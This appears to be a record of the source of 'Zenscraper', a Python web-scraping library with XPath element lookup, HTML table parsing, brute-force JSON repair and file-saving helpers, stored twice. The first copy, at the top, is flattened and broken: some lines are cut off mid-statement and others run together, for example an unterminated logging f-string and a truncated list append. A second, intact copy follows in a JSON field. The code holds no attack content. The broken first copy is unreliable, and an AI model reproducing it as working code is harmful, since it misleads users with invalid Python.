show_url(self):\r \"\"\"\r get the current URL Link\r :return:\r \"\"\"\r return str(self.response.url)\r \r @staticmethod\r def get_json(url, sleep_seconds=None):\r \"\"\"\r :param url: url to get json\r :return: json file\r \"\"\"\r logger.info('Get JSON file from %s', url)\r if sleep_seconds is None:\r sleep_seconds=random.randint(1, 3)\r req=RequestsWrapper()\r res=req.get(url, sleep_seconds=sleep_seconds)\r return res.json()\r \r def get_json_from_html_script_tag(self, doc=None, index=0, to_add_or_remove=None, **kwargs):\r \"\"\"\r :param doc: response document object\r :param index: index on the <script\/> tag\r :return: return a json dictionary\r \"\"\"\r json_object=None\r logger.info('getting json from html script')\r if doc is None:\r doc=self.doc\r \r soup=BeautifulSoup(self.print_html(is_print=False), 'lxml')\r res=soup.find('script', **kwargs)\r \r try:\r json_object=json.loads(res.contents[index])\r return json_object\r except Exception as err:\r logger.error(err)\r bad_json=res.contents[index]\r improved_json=re.sub(r'\"\\s*$', '\",', bad_json, flags=re.MULTILINE)\r improved_json.replace('\"\\\\', '')\r improved_json.replace(\"\\'\", '\"')\r json_object=self._bruteforce_json_fix(improved_json)\r \r return json_object\r \r @staticmethod\r def _bruteforce_json_fix(improved_json, retry_count=20):\r \r def add_strings(prefix, improved_json, retry_count, prefix_to_increment='}]'):\r for i in range(retry_count):\r suffix=''\r for j in range(retry_count):\r try:\r suffix +='}'\r json_object=json.loads(f'{improved_json}{prefix}{suffix}')\r logger.warning('json bruteforce success.')\r return json_object\r except Exception:\r logger.info(f'fix_type prefix +=prefix_to_increment\r return None\r \r json_object=add_strings('\"', improved_json, retry_count)\r if json_object is not None:\r return json_object\r \r json_object=add_strings('', improved_json, retry_count)\r if json_object is not None:\r return json_object\r \r json_object=add_strings('\"', improved_json, retry_count, prefix_to_increment=']')\r if json_object is not None:\r return json_object\r \r json_object=add_strings('', improved_json, retry_count, prefix_to_increment=']')\r if json_object is not None:\r return json_object\r \r return None\r \r class ZenElement:\r \"\"\" ZenElement, work like selenium Element Object \"\"\"\r element=None\r \r def __init__(self, element):\r \"\"\" Init ZenElement \"\"\"\r self.element=element\r \r def __find_elements_list(self, err_message=\"\", xpath=\"\"):\r \"\"\" Find Elements \"\"\"\r try:\r element_list=[]\r elements=self.element.xpath(xpath)\r for element in elements:\r element_list.append(ZenElement(element))\r \r if len(element_list) !=0:\r logger.info('element list generated')\r return element_list\r logger.warning('no element list generated')\r return[]\r \r except(IndexError, lxml.etree.XPathEvalError, lxml.etree.XPathError,\r lxml.etree.Error) as err:\r logger.error(err_message)\r logger.error(err)\r return None\r \r def __find_element(self, err_message=\"\", xpath=\"\"):\r \"\"\" Find ELement\"\"\"\r try:\r logger.info(f'{ZenElement(self.element.xpath(xpath)[0]).get_tag()} element found') return ZenElement(self.element.xpath(xpath)[0])\r except(lxml.etree.XPathEvalError, lxml.etree.XPathError, lxml.etree.Error) as err:\r logger.error(err_message)\r logger.error(err)\r return None\r \r @staticmethod\r def __return_dict_values(by_mode, to_search, tag=\"node()\"):\r output_dict={\r 1:{'err_message': \"<Error: id cannot be found on the html>\",\r 'xpath': f'\/\/node()[@id=\"{to_search}\"]'},\r 2:{'err_message': \"<Error: element cannot be found on the html>\",\r 'xpath': to_search},\r 3:{'err_message': f\"<Error: no element that contains{to_search} in the html>\",\r 'xpath': f'\/\/{tag}[normalize-space(text())=\"{to_search}\"]'},\r 4:{'err_message': f\"<Error: no element that contains{to_search} in the html>\",\r 'xpath': f'\/\/{tag}[contains(text(), \"{to_search}\")]'},\r 6:{'err_message': \"<Error: tagname cannot be found on the html>\",\r 'xpath': f\"\/\/{to_search}\"},\r }\r return output_dict[by_mode.value]\r \r def __inner_text(self, inner_text_filter=None):\r \"\"\"\r :param inner_text_filter: you can add an array if you want\r ot add additional filter for your inner_text\r :return: filtered string\r \"\"\"\r element_str=self.__to_string()\r stripped=UtilFunctions().strip_html(element_str)\r if inner_text_filter:\r for rep in inner_text_filter:\r stripped=stripped.replace(rep, \"\")\r stripped=stripped.strip()\r return stripped\r \r def __to_string(self):\r \"\"\"\r Get the innerHTML of an Element, and convert it to string\r :return: string\r \"\"\"\r string=str(etree.tostring(self.element))\r string=string.replace(\"b'\", \"\")[:-1]\r return string\r \r def find_elements(self, by_mode, to_search, tag=\"node()\"):\r \"\"\"\r :param by_mode: By Enumerator the guide on what to search e.g. By.XPATH, By.TAG_NAME\r :param to_search: tosearch on the document body\r :param tag: parent element tag, default node(), means all element\r :return: List of ZenElement Objects\r \"\"\"\r output_dict=self.__return_dict_values(by_mode, to_search, tag)\r return self.__find_elements_list(**output_dict)\r \r def find_element(self, by_mode, to_search, tag=\"node()\"):\r \"\"\"\r :param by_mode: By Enumerator the guide on what to search e.g. By.XPATH, By.TAG_NAME\r :param to_search: tosearch on the document body\r :param tag: parent element tag, default node(), means all element\r :return: ZenElement Object\r \"\"\"\r output_dict=self.__return_dict_values(by_mode, to_search, tag)\r return self.__find_element(**output_dict)\r \r def get_attribute(self, attribute=\"\", inner_text_filter=None):\r \"\"\"\r :param attribute: attribute like innerText, innerHTML,\r class, image, alt, title etc.\r :param inner_text_filter: if you want to filter your string,\r only work on innerText attribute\r :return: string\r \"\"\"\r logger.info('Get Element Attribute %s', attribute)\r err_message=(\r \"<Error: attribute in the element cannot be found, try different attribute>\"\r )\r try:\r if attribute=='innerText':\r return self.__inner_text(inner_text_filter)\r if attribute=='innerHTML':\r return self.__to_string()\r if self.element.attrib.get(attribute) is None:\r logging.error(err_message)\r return None\r \r return str(self.element.attrib.get(attribute))\r except(lxml.etree.XPathEvalError, lxml.etree.Error, lxml.etree.XPathError) as err:\r logging.error(err)\r logging.error(err_message)\r return None\r \r def get_tag(self):\r \"\"\"\r get the current tag of the element\r :return:\r \"\"\"\r logger.info('Get Element Tag')\r err_message=\"<Error: There is no Text inside the Element>\"\r try:\r if self.element is None:\r logging.error(err_message)\r return None\r \r string=str(self.element).split(\"Element\")[1].strip()\r string=string.split(\"at\")[0].strip()\r return string\r except(lxml.etree.XPathEvalError, lxml.etree.Error, lxml.etree.XPathError) as err:\r logging.error(err)\r logging.error(err_message)\r return None\r \r def get_text(self):\r \"\"\" get text inside the element, use get_attribute('innerText')\r if you want all the text inside the element \"\"\"\r logger.info('Get text from element')\r err_message=\"<Error: There is no text inside this Element>\"\r try:\r if self.element.text is None:\r logging.error(err_message)\r return None\r \r return self.element.text\r except(lxml.etree.XPathEvalError, lxml.etree.Error, lxml.etree.XPathError) as err:\r logging.error(err)\r logging.error(err_message)\r return None\r \r def get_parent(self):\r \"\"\"get the parent element of the current element\"\"\"\r logger.info('Getting Element Parent')\r return ZenElement(self.element.xpath(\".\/parent::node()\")[0])\r \r def get_children(self, tagname=\"*\"):\r \"\"\"\r get the children of the current element\r :param tagname: you can select tag to filter the children,\r e.g. if you want to search a tag, just input a\r :return: List of ZenElement Object\r \"\"\"\r logger.info('Getting Element Children')\r return self.__find_elements_list(\r err_message=\"<Error: No Children Inside the element>\",\r xpath=f\".\/children::{tagname}\",\r )\r \r class By(Enum):\r \"\"\" By Enumerator to make element searching same as Selenium Searching format. \"\"\"\r ID=1\r XPATH=2\r LINK_TEXT=3\r PARTIAL_LINK_TEXT=4\r NAME=5\r TAG_NAME=6\r CLASS_NAME=7\r CSS_SELECTOR=8\r \r class DataType:\r \"\"\"Unique type class to decipher between attributes\"\"\"\r \r def __init__(self, key, value):\r \"\"\" ORM Type Key value to add on the ORM Object\"\"\"\r self.key=key\r self.value=value\r \r def __repr__(self):\r \"\"\"Return value\"\"\"\r return str(self.value)\r \r def __index__(self):\r \"\"\"Return Key\"\"\"\r return int(self.key)\r \r class DataObject:\r \"\"\"Basic ORM Class\"\"\"\r \r def __init__(self, **kwargs):\r \"\"\"ORM to create classess with variables\"\"\"\r for key, value in kwargs.items():\r setattr(self, key, DataType(key, value))\r \r @staticmethod\r def attr_1():\r \"\"\"Adding this for Pylint issues\"\"\"\r print(\"attr_1\")\r \r @staticmethod\r def attr_2():\r \"\"\"Adding this for Pylint issues\"\"\"\r print(\"attr_2\")\r \r class UtilFunctions:\r \"\"\" Utility Functions mostly used in Scraping \"\"\"\r @staticmethod\r def strip_html(data):\r \"\"\" strip html tags from the string. \"\"\"\r logger.info('stripping HTML tags from string')\r string=re.compile(r\"<.*?>|=\")\r return string.sub(\"\", data)\r \r @staticmethod\r def remove_non_digits(seq):\r seq_type=type(seq)\r return seq_type().join(filter(seq_type.isdigit, seq))\r \r @staticmethod\r def create_directory(dir_name):\r \"\"\" Create a directory \"\"\"\r logger.info('Creating Directory')\r Path(dir_name).mkdir(parents=True, exist_ok=True)\r \r def save_html(self, url='', htmldir='', filename='', driver=None):\r \"\"\"\r :param url: url of the html page you want to save\r :param htmldir: directory on where to save the html\r :param filename: the filename on the saved directory\r :param driver: this is for selenium, if driver is stated that means\r that we will download the page from selenium, url not needed\r :return:\r \"\"\"\r logger.info('saving HTML files')\r self.create_directory(htmldir)\r \r if driver:\r with open(f'{htmldir}\/{filename}.html', 'w', encoding='utf-8') as file:\r file.write(driver.page_source)\r else:\r req=RequestsWrapper()\r res=req.get(url)\r with open(f'{htmldir}\/{filename}.html', 'w', encoding='utf-8') as file:\r file.write(res.text)\r \r def save_json(self, url='', jsondir='', file_name='data.json'):\r \"\"\"\r :param url: url of the html page you want to save\r :param jsondir: directory on where to save the json\r :param file_name: the filename on the saved directory\r :return:\r \"\"\"\r self.create_directory(jsondir)\r sold_items=requests.get(url)\r Path(f'{jsondir}\/{file_name}.json').write_bytes(sold_items.content)\r \r @staticmethod\r def is_partial_run(parser):\r \"\"\" Create a Partial run based on an argument \"\"\"\r logger.info('Executing Code on Partial Run')\r return parser.parse_args().run\r \r @staticmethod\r def end_partial_run(fetch, header=None): \"\"\" End Partial Run based on an argument \"\"\"\r logger.info('Ending Partial Run')\r fetch_arr=fetch\r fetch_arr.append([' return fetch_arr\r ","sourceWithComments":"\"\"\"Zenscraper Python Library v 0.2\"\"\"\r\nfrom enum import Enum\r\nimport shutil\r\nimport re\r\nimport sys\r\nimport json\r\nimport time\r\nimport random\r\nimport logging\r\nfrom pathlib import Path\r\nfrom bs4 import BeautifulSoup\r\nimport requests\r\nimport lxml.html\r\nfrom lxml import etree\r\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\r\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\r\nsys.path.append('..\/..\/scripts')\r\nfrom pyersq.requests_wrapper import RequestsWrapper\r\n\r\nlogging.basicConfig()\r\nlogger = logging.getLogger(__name__)\r\nlogger.setLevel(logging.WARNING)\r\n\r\n# zenscraper version 0.2b\r\nclass ZenScraper:\r\n    \"\"\" ZenScraper , stealth scraping that follows selenium rules. \"\"\"\r\n    doc = None\r\n    response = None\r\n\r\n    def __find_elements_list(self, err_message=\"\", xpath=\"\", doc=None):\r\n        \"\"\" find multiple elements in the class \"\"\"\r\n        try:\r\n            element_list = []\r\n            if doc is None:\r\n                doc = self.doc\r\n            elements = doc.xpath(xpath)\r\n            for element in elements:\r\n                element_list.append(ZenElement(element))\r\n            if len(element_list) != 0:\r\n                logger.info('element list generated') #\r\n                return element_list\r\n            logger.warning('no element list found')\r\n            return []\r\n        except (IndexError, lxml.etree.XPathEvalError,\r\n                lxml.etree.Error, lxml.etree.XPathError) as err:\r\n            logger.warning(err_message)\r\n            logger.error(f'{err}') # pylint: disable=logging-fstring-interpolation\r\n            return None\r\n\r\n    def __find_element(self, err_message=\"\", xpath=\"\", doc=None):\r\n        \"\"\" find single element from the class \"\"\"\r\n        try:\r\n            if doc is None:\r\n                doc = self.doc\r\n            element = doc.xpath(xpath)\r\n            logger.info(f'{ZenElement(element[0]).get_tag()} element found') # pylint: disable=logging-fstring-interpolation\r\n            return ZenElement(element[0])\r\n        except (IndexError, lxml.etree.XPathEvalError, lxml.etree.XPathError,\r\n                lxml.etree.Error) as err:\r\n            logger.warning(err_message)\r\n            logger.error(f'{err}') # pylint: disable=logging-fstring-interpolation\r\n            return None\r\n\r\n    @staticmethod\r\n    def __return_dict_values(by_mode, to_search, doc=None, tag=\"node()\"):\r\n        output_dict = {\r\n            1: {'err_message': \"<Error: id cannot be found on the html>\",\r\n                'xpath': f'\/\/node()[@id=\"{to_search}\"]',\r\n                'doc': doc},\r\n            2: {'err_message': \"<Error: element cannot be found on the html>\",\r\n                'xpath': to_search,\r\n                'doc': doc},\r\n            3: {'err_message': f\"<Error: no element that contains {to_search} in the html>\",\r\n                'xpath': f'\/\/{tag}[normalize-space(text()) = \"{to_search}\"]',\r\n                'doc': doc},\r\n            4: {'err_message': f\"<Error: no element that contains {to_search} in the html>\",\r\n                'xpath': f'\/\/{tag}[contains(text(), \"{to_search}\")]',\r\n                'doc': doc},\r\n            6: {'err_message': \"<Error: tagname cannot be found on the html>\",\r\n                'xpath': f\"\/\/{to_search}\",\r\n                'doc': doc},\r\n        }\r\n        return output_dict[by_mode.value]\r\n\r\n    def get(self, url, sleep_seconds=None):\r\n        \"\"\"\r\n        :param url: destination url to get document body\r\n        :return:\r\n        \"\"\"\r\n        logger.info('GET request on %s', url)\r\n        if sleep_seconds is None:\r\n            sleep_seconds=random.randint(1, 3)\r\n        req = RequestsWrapper()\r\n        response = req.get(url, sleep_seconds=sleep_seconds)\r\n        self.response = response\r\n        self.doc = lxml.html.fromstring(response.content)\r\n        return response\r\n\r\n    @staticmethod\r\n    def download_file(url, destination_path=\"\"):\r\n        \"\"\"\r\n        :param url: url to download file\r\n        :param destination_path: directory with file name to store image data\r\n        :return:\r\n        \"\"\"\r\n        req = RequestsWrapper()\r\n        response = req.get(url)\r\n        logger.info(f\"downloading: {url}\") # pylint: disable=logging-fstring-interpolation\r\n        filename = url.split(\"\/\")[-1]\r\n        if destination_path == \"\":\r\n            file_destination = filename\r\n        else:\r\n            UtilFunctions().create_directory(destination_path)\r\n            file_destination = f\"{destination_path}\/{filename}\"\r\n\r\n        with open(file_destination, \"wb\") as out_file:\r\n            shutil.copyfileobj(response.raw, out_file)\r\n        del response\r\n\r\n        logger.error('error on file download')\r\n\r\n    @staticmethod\r\n    def get_html_table(driver=None, table_index=0, just_header=False, with_header=False, **kwargs): #pylint: disable=too-many-locals,too-many-branches\r\n        \"\"\"\r\n        Getting HTMl Table from <table> tag inside an html\r\n        :param driver: selenium driver to scrape table data\r\n        :param table_index: index of the table to be sraped\r\n        :param just_header: return an array of table header\r\n        :param with_header: boolean if table header will be included in the scrape\r\n        :return: list of dict if with_header == True, list of list if with_header == False\r\n        \"\"\"\r\n        try:\r\n            logger.info('scraping HTML table from page_source')\r\n            soup = BeautifulSoup(driver.page_source, 'lxml')\r\n            if len(kwargs) > 0:\r\n                tables = soup.find_all('table', **kwargs)\r\n            else:\r\n                tables = soup.find_all('table')\r\n\r\n            table_body = tables[table_index].find('tbody')\r\n\r\n            if just_header:\r\n                logger.info('scraping the header of the HTML table')\r\n                table_header = tables[table_index].find('thead')\r\n                header = []\r\n                for row in table_header.find_all('tr'):\r\n                    for count, col in enumerate(row.find_all('th')):\r\n                        val = col.text.strip()\r\n                        if len(val) == 0:\r\n                            header.append(str(count))\r\n                            continue\r\n                        header.append(col.text.strip())\r\n                    return header\r\n\r\n            if with_header:\r\n                logger.info('Scraping header of the HTML table with content')\r\n                table_header = tables[table_index].find('thead')\r\n                header = []\r\n                table_data = []\r\n                for row in table_header.find_all('tr'):\r\n                    for count, col in enumerate(row.find_all('th')):\r\n                        val = col.text.strip()\r\n                        if len(val) == 0:\r\n                            header.append(str(count))\r\n                            continue\r\n                        header.append(col.text.strip())\r\n\r\n                for row in table_body.find_all('tr'):\r\n                    data = {}\r\n                    for count, col in enumerate(row.find_all('td')):\r\n                        val = col.text.strip()\r\n                        data.update({header[count]:val})\r\n                    table_data.append(data)\r\n                return table_data\r\n\r\n            logger.info('Scraping the body of the HTML table')\r\n            table_data = []\r\n            for row in table_body.find_all('tr'):\r\n                data = []\r\n                for col in row.find_all('td'):\r\n                    data.append(col.text.strip())\r\n                table_data.append(data)\r\n            return table_data\r\n        except Exception as err: #pylint: disable=broad-except\r\n            logger.error('HTML Table scraping failed!!!')\r\n            logger.error(err)\r\n            return []\r\n\r\n    def find_elements(self, by_mode, to_search, doc=None, tag=\"node()\"):\r\n        \"\"\"\r\n        :param by_mode: By Enumerator to search for e.g. XPATH, ID, CLASSNAME\r\n        :param tosearch: the string to search\r\n        :param doc: document body\r\n        :param tag: works best with LINK_TEXT, PARTIAL_LINK_TEXT\r\n        :return: ZenElement Object\r\n        \"\"\"\r\n        output_dict = self.__return_dict_values(by_mode, to_search, doc, tag)\r\n        return self.__find_elements_list(**output_dict)\r\n\r\n    def find_element(self, by_mode, to_search, doc=None, tag=\"node()\"):\r\n        \"\"\"\r\n        :param by: By Enumerator to search for e.g. XPATH, ID, CLASSNAME\r\n        :param tosearch: the string to search\r\n        :param doc: document body\r\n        :param tag: works best with LINK_TEXT, PARTIAL_LINK_TEXT\r\n        :return: ZenElement Object\r\n        \"\"\"\r\n        output_dict = self.__return_dict_values(by_mode, to_search, doc, tag)\r\n        return self.__find_element(**output_dict)\r\n\r\n    def print_html(self, is_print=True):\r\n        \"\"\"\r\n        Print the HTMl file on the console.\r\n        :return: HTML File as a String\r\n        \"\"\"\r\n        logger.info('Printing HTML')\r\n        if is_print:\r\n            print(etree.tostring(self.doc, pretty_print=True))\r\n        return etree.tostring(self.doc, pretty_print=True)\r\n\r\n    def status_code(self):\r\n        \"\"\"\r\n        Print status_code on console\r\n        :return: return status_code as an integer\r\n        \"\"\"\r\n        logger.info(self.response.status_code)\r\n        return self.response.status_code\r\n\r\n    @staticmethod\r\n    def check_link(url, sleep_seconds=None):\r\n        \"\"\"\r\n        :param url: url of the link to check\r\n        :return: check if link exists\r\n        \"\"\"\r\n        logger.info('Checking link %s', url)\r\n        if sleep_seconds is None:\r\n            sleep_seconds=random.randint(1, 3)\r\n        req = RequestsWrapper()\r\n        response = req.get(url, sleep_seconds=sleep_seconds)\r\n        logger.info(response.status_code)\r\n        return response.status_code == 200\r\n\r\n    def show_url(self):\r\n        \"\"\"\r\n        get the current URL Link\r\n        :return:\r\n        \"\"\"\r\n        return str(self.response.url)\r\n\r\n    @staticmethod\r\n    def get_json(url, sleep_seconds=None):\r\n        \"\"\"\r\n        :param url: url to get json\r\n        :return: json file\r\n        \"\"\"\r\n        logger.info('Get JSON file from %s', url)\r\n        if sleep_seconds is None:\r\n            sleep_seconds=random.randint(1, 3)\r\n        req = RequestsWrapper()\r\n        res = req.get(url, sleep_seconds=sleep_seconds)\r\n        return res.json()\r\n\r\n    def get_json_from_html_script_tag(self, doc=None, index=0, to_add_or_remove = None, **kwargs):\r\n        \"\"\"\r\n        :param doc: response document object\r\n        :param index: index on the <script\/> tag\r\n        :return: return a json dictionary\r\n        \"\"\"\r\n        json_object = None\r\n        logger.info('getting json from html script')\r\n        if doc is None:\r\n            doc = self.doc\r\n\r\n        soup = BeautifulSoup(self.print_html(is_print=False), 'lxml')\r\n        res = soup.find('script', **kwargs)\r\n\r\n        try:\r\n            json_object = json.loads(res.contents[index])\r\n            return json_object\r\n        except Exception as err:\r\n            logger.error(err)\r\n            bad_json = res.contents[index]\r\n            improved_json = re.sub(r'\"\\s*$', '\",', bad_json, flags=re.MULTILINE)\r\n            improved_json.replace('\"\\\\', '')\r\n            improved_json.replace(\"\\'\", '\"')\r\n            json_object = self._bruteforce_json_fix(improved_json)\r\n\r\n        return json_object\r\n\r\n    @staticmethod\r\n    def _bruteforce_json_fix(improved_json, retry_count=20):\r\n\r\n        def add_strings(prefix, improved_json, retry_count, prefix_to_increment='}]'):\r\n            for i in range(retry_count):\r\n                suffix = ''\r\n                for j in range(retry_count):\r\n                    try:\r\n                        suffix += '}'\r\n                        json_object = json.loads(f'{improved_json}{prefix}{suffix}')\r\n                        logger.warning('json bruteforce success.')\r\n                        return json_object\r\n                    except Exception:\r\n                        logger.info(f'fix_type #{i} adding {prefix}{suffix}: retrying {j} times.')\r\n                prefix += prefix_to_increment\r\n            return None\r\n\r\n        json_object = add_strings('\"', improved_json, retry_count)\r\n        if json_object is not None:\r\n            return json_object\r\n\r\n        json_object = add_strings('', improved_json, retry_count)\r\n        if json_object is not None:\r\n            return json_object\r\n\r\n        json_object = add_strings('\"', improved_json, retry_count, prefix_to_increment=']')\r\n        if json_object is not None:\r\n            return json_object\r\n\r\n        json_object = add_strings('', improved_json, retry_count, prefix_to_increment=']')\r\n        if json_object is not None:\r\n            return json_object\r\n\r\n        return None\r\n\r\nclass ZenElement:\r\n    \"\"\" ZenElement , work like selenium Element Object \"\"\"\r\n    element = None\r\n\r\n    def __init__(self, element):\r\n        \"\"\" Init ZenElement \"\"\"\r\n        self.element = element\r\n\r\n    def __find_elements_list(self, err_message=\"\", xpath=\"\"):\r\n        \"\"\" Find Elements \"\"\"\r\n        try:\r\n            element_list = []\r\n            elements = self.element.xpath(xpath)\r\n            for element in elements:\r\n                element_list.append(ZenElement(element))\r\n\r\n            if len(element_list) != 0:\r\n                logger.info('element list generated')\r\n                return element_list\r\n            logger.warning('no element list generated')\r\n            return []\r\n\r\n        except (IndexError, lxml.etree.XPathEvalError, lxml.etree.XPathError,\r\n                lxml.etree.Error) as err:\r\n            logger.error(err_message)\r\n            logger.error(err)\r\n            return None\r\n\r\n    def __find_element(self, err_message=\"\", xpath=\"\"):\r\n        \"\"\" Find ELement\"\"\"\r\n        try:\r\n            logger.info(f'{ZenElement(self.element.xpath(xpath)[0]).get_tag()} element found') # pylint: disable=logging-fstring-interpolation\r\n            return ZenElement(self.element.xpath(xpath)[0])\r\n        except (lxml.etree.XPathEvalError, lxml.etree.XPathError, lxml.etree.Error) as err:\r\n            logger.error(err_message)\r\n            logger.error(err)\r\n            return None\r\n\r\n    @staticmethod\r\n    def __return_dict_values(by_mode, to_search, tag=\"node()\"):\r\n        output_dict = {\r\n            1: {'err_message': \"<Error: id cannot be found on the html>\",\r\n                'xpath': f'\/\/node()[@id=\"{to_search}\"]'},\r\n            2: {'err_message': \"<Error: element cannot be found on the html>\",\r\n                'xpath': to_search},\r\n            3: {'err_message': f\"<Error: no element that contains {to_search} in the html>\",\r\n                'xpath': f'\/\/{tag}[normalize-space(text()) = \"{to_search}\"]'},\r\n            4: {'err_message': f\"<Error: no element that contains {to_search} in the html>\",\r\n                'xpath': f'\/\/{tag}[contains(text(), \"{to_search}\")]'},\r\n            6: {'err_message': \"<Error: tagname cannot be found on the html>\",\r\n                'xpath': f\"\/\/{to_search}\"},\r\n        }\r\n        return output_dict[by_mode.value]\r\n\r\n    def __inner_text(self, inner_text_filter=None):\r\n        \"\"\"\r\n        :param inner_text_filter: you can add an array if you want\r\n        ot add additional filter for your inner_text\r\n        :return: filtered string\r\n        \"\"\"\r\n        element_str = self.__to_string()\r\n        stripped = UtilFunctions().strip_html(element_str)\r\n        if inner_text_filter:\r\n            for rep in inner_text_filter:\r\n                stripped = stripped.replace(rep, \"\")\r\n        stripped = stripped.strip()\r\n        return stripped\r\n\r\n    def __to_string(self):\r\n        \"\"\"\r\n        Get the innerHTML of an Element, and convert it to string\r\n        :return: string\r\n        \"\"\"\r\n        string = str(etree.tostring(self.element))\r\n        string = string.replace(\"b'\", \"\")[:-1]\r\n        return string\r\n\r\n    def find_elements(self, by_mode, to_search, tag=\"node()\"):\r\n        \"\"\"\r\n        :param by_mode: By Enumerator the guide on what to search e.g. By.XPATH, By.TAG_NAME\r\n        :param to_search: tosearch on the document body\r\n        :param tag: parent element tag , default node(), means all element\r\n        :return: List of ZenElement Objects\r\n        \"\"\"\r\n        output_dict = self.__return_dict_values(by_mode, to_search, tag)\r\n        return self.__find_elements_list(**output_dict)\r\n\r\n    def find_element(self, by_mode, to_search, tag=\"node()\"):\r\n        \"\"\"\r\n        :param by_mode: By Enumerator the guide on what to search e.g. By.XPATH, By.TAG_NAME\r\n        :param to_search: tosearch on the document body\r\n        :param tag: parent element tag , default node(), means all element\r\n        :return: ZenElement Object\r\n        \"\"\"\r\n        output_dict = self.__return_dict_values(by_mode, to_search, tag)\r\n        return self.__find_element(**output_dict)\r\n\r\n    def get_attribute(self, attribute=\"\", inner_text_filter=None):\r\n        \"\"\"\r\n        :param attribute: attribute like innerText, innerHTML,\r\n         class, image, alt, title etc.\r\n        :param inner_text_filter: if you want to filter your string ,\r\n         only work on innerText attribute\r\n        :return: string\r\n        \"\"\"\r\n        logger.info('Get Element Attribute %s', attribute)\r\n        err_message = (\r\n            \"<Error: attribute in the element cannot be found, try different attribute>\"\r\n        )\r\n        try:\r\n            if attribute == 'innerText':\r\n                return self.__inner_text(inner_text_filter)\r\n            if attribute == 'innerHTML':\r\n                return self.__to_string()\r\n            if self.element.attrib.get(attribute) is None:\r\n                logging.error(err_message)\r\n                return None\r\n\r\n            return str(self.element.attrib.get(attribute))\r\n        except (lxml.etree.XPathEvalError, lxml.etree.Error, lxml.etree.XPathError) as err:\r\n            logging.error(err)\r\n            logging.error(err_message)\r\n            return None\r\n\r\n    def get_tag(self):\r\n        \"\"\"\r\n        get the current tag of the element\r\n        :return:\r\n        \"\"\"\r\n        logger.info('Get Element Tag')\r\n        err_message = \"<Error: There is no Text inside the Element>\"\r\n        try:\r\n            if self.element is None:\r\n                logging.error(err_message)\r\n                return None\r\n\r\n            string = str(self.element).split(\"Element\")[1].strip()\r\n            string = string.split(\"at\")[0].strip()\r\n            return string\r\n        except (lxml.etree.XPathEvalError, lxml.etree.Error, lxml.etree.XPathError) as err:\r\n            logging.error(err)\r\n            logging.error(err_message)\r\n            return None\r\n\r\n    def get_text(self):\r\n        \"\"\" get text inside the element , use get_attribute('innerText')\r\n         if you want all the text inside the element \"\"\"\r\n        logger.info('Get text from element')\r\n        err_message = \"<Error: There is no text inside this Element>\"\r\n        try:\r\n            if self.element.text is None:\r\n                logging.error(err_message)\r\n                return None\r\n\r\n            return self.element.text\r\n        except (lxml.etree.XPathEvalError, lxml.etree.Error, lxml.etree.XPathError) as err:\r\n            logging.error(err)\r\n            logging.error(err_message)\r\n            return None\r\n\r\n    def get_parent(self):\r\n        \"\"\"get the parent element of the current element\"\"\"\r\n        logger.info('Getting Element Parent')\r\n        return ZenElement(self.element.xpath(\".\/parent::node()\")[0])\r\n\r\n    def get_children(self, tagname=\"*\"):\r\n        \"\"\"\r\n        get the children of the current element\r\n        :param tagname: you can select tag to filter the children,\r\n         e.g. if you want to search a tag, just input a\r\n        :return: List of ZenElement Object\r\n        \"\"\"\r\n        logger.info('Getting Element Children')\r\n        return self.__find_elements_list(\r\n            err_message=\"<Error: No Children Inside the element>\",\r\n            xpath=f\".\/children::{tagname}\",\r\n        )\r\n\r\nclass By(Enum):\r\n    \"\"\" By Enumerator to make element searching same as Selenium Searching format. \"\"\"\r\n    ID = 1\r\n    XPATH = 2\r\n    LINK_TEXT = 3\r\n    PARTIAL_LINK_TEXT = 4\r\n    NAME = 5\r\n    TAG_NAME = 6\r\n    CLASS_NAME = 7\r\n    CSS_SELECTOR = 8\r\n\r\nclass DataType:\r\n    \"\"\"Unique type class to decipher between attributes\"\"\"\r\n\r\n    def __init__(self, key, value):\r\n        \"\"\" ORM Type Key value to add on the ORM Object\"\"\"\r\n        self.key = key\r\n        self.value = value\r\n\r\n    def __repr__(self):\r\n        \"\"\"Return value\"\"\"\r\n        return str(self.value)\r\n\r\n    def __index__(self):\r\n        \"\"\"Return Key\"\"\"\r\n        return int(self.key)\r\n\r\nclass DataObject:\r\n    \"\"\"Basic ORM Class\"\"\"\r\n\r\n    def __init__(self, **kwargs):\r\n        \"\"\"ORM to create classess with variables\"\"\"\r\n        for key, value in kwargs.items():\r\n            setattr(self, key, DataType(key, value))\r\n\r\n    @staticmethod\r\n    def attr_1():\r\n        \"\"\"Adding this for Pylint issues\"\"\"\r\n        print(\"attr_1\")\r\n\r\n    @staticmethod\r\n    def attr_2():\r\n        \"\"\"Adding this for Pylint issues\"\"\"\r\n        print(\"attr_2\")\r\n\r\nclass UtilFunctions:\r\n    \"\"\" Utility Functions mostly used in Scraping \"\"\"\r\n    @staticmethod\r\n    def strip_html(data):\r\n        \"\"\" strip html tags from the string. \"\"\"\r\n        logger.info('stripping HTML tags from string')\r\n        string = re.compile(r\"<.*?>|=\")\r\n        return string.sub(\"\", data)\r\n\r\n    @staticmethod\r\n    def remove_non_digits(seq):\r\n        seq_type = type(seq)\r\n        return seq_type().join(filter(seq_type.isdigit, seq))\r\n\r\n    @staticmethod\r\n    def create_directory(dir_name):\r\n        \"\"\" Create a directory \"\"\"\r\n        logger.info('Creating Directory')\r\n        Path(dir_name).mkdir(parents=True, exist_ok=True)\r\n\r\n    def save_html(self, url='', htmldir='', filename='', driver=None):\r\n        \"\"\"\r\n        :param url: url of the html page you want to save\r\n        :param htmldir: directory on where to save the html\r\n        :param filename: the filename on the saved directory\r\n        :param driver: this is for selenium, if driver is stated that means\r\n        that we will download the page from selenium, url not needed\r\n        :return:\r\n        \"\"\"\r\n        logger.info('saving HTML files')\r\n        self.create_directory(htmldir)\r\n\r\n        if driver:\r\n            with open(f'{htmldir}\/{filename}.html', 'w', encoding='utf-8') as file:\r\n                file.write(driver.page_source)\r\n        else:\r\n            req = RequestsWrapper()\r\n            res = req.get(url)\r\n            with open(f'{htmldir}\/{filename}.html', 'w', encoding='utf-8') as file:\r\n                file.write(res.text)\r\n\r\n    def save_json(self, url='', jsondir='', file_name='data.json' ):\r\n        \"\"\"\r\n        :param url: url of the html page you want to save\r\n        :param jsondir: directory on where to save the json\r\n        :param file_name: the filename on the saved directory\r\n        :return:\r\n        \"\"\"\r\n        self.create_directory(jsondir)\r\n        sold_items = requests.get(url)\r\n        Path(f'{jsondir}\/{file_name}.json').write_bytes(sold_items.content)\r\n\r\n    